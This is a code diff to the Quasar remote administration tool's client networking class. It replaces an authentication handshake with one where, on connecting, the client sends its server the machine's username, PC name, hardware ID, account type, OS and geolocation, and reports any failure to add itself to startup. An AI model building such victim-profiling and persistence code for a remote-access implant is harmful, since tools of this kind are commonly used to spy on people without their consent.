@@ -5,6 +5,7 @@ using System.Windows.Forms;
 using Quasar.Client.Config;
 using Quasar.Client.Core.Commands;
 using Quasar.Client.Core.Data;
+using Quasar.Client.Core.Helper;
 using Quasar.Client.Core.Utilities;
 using Quasar.Common.Messages;
 using Quasar.Common.Utilities;
@@ -17,7 +18,7 @@ namespace Quasar.Client.Core.Networking
         /// When Exiting is true, stop all running threads and exit.
         /// </summary>
         public static bool Exiting { get; private set; }
-        public bool Authenticated { get; private set; }
+        public bool Identified { get; private set; }
         private readonly HostsManager _hosts;
         private readonly SafeRandom _random;
 
@@ -65,17 +66,12 @@ namespace Quasar.Client.Core.Networking
 
         private void OnClientRead(Client client, IMessage message)
         {
-            var type = message.GetType();
-
-            if (!Authenticated)
+            if (!Identified)
             {
-                if (type == typeof(GetAuthentication))
+                if (message.GetType() == typeof(ClientIdentificationResult))
                 {
-                    CommandHandler.HandleGetAuthentication((GetAuthentication)message, client);
-                }
-                else if (type == typeof(SetAuthenticationSuccess))
-                {
-                    Authenticated = true;
+                    var reply = (ClientIdentificationResult) message;
+                    Identified = reply.Result;
                 }
                 return;
             }
@@ -91,7 +87,40 @@ namespace Quasar.Client.Core.Networking
 
         private void OnClientState(Client client, bool connected)
         {
-            Authenticated = false; // always reset authentication
+            Identified = false; // always reset identification
+
+            if (connected)
+            {
+                // send client identification once connected
+
+                GeoLocationHelper.Initialize();
+
+                client.Send(new ClientIdentification
+                {
+                    Version = Settings.VERSION,
+                    OperatingSystem = PlatformHelper.FullName,
+                    AccountType = WindowsAccountHelper.GetAccountType(),
+                    Country = GeoLocationHelper.GeoInfo.Country,
+                    CountryCode = GeoLocationHelper.GeoInfo.CountryCode,
+                    Region = GeoLocationHelper.GeoInfo.Region,
+                    City = GeoLocationHelper.GeoInfo.City,
+                    ImageIndex = GeoLocationHelper.ImageIndex,
+                    Id = DevicesHelper.HardwareId,
+                    Username = WindowsAccountHelper.GetName(),
+                    PcName = SystemHelper.GetPcName(),
+                    Tag = Settings.TAG
+                });
+
+                if (ClientData.AddToStartupFailed)
+                {
+                    Thread.Sleep(2000);
+                    client.Send(new SetStatus
+                    {
+                        Message = "Adding to startup failed."
+                    });
+                }
+            }
+            
 
             if (!connected && !Exiting)
                 LostConnection();
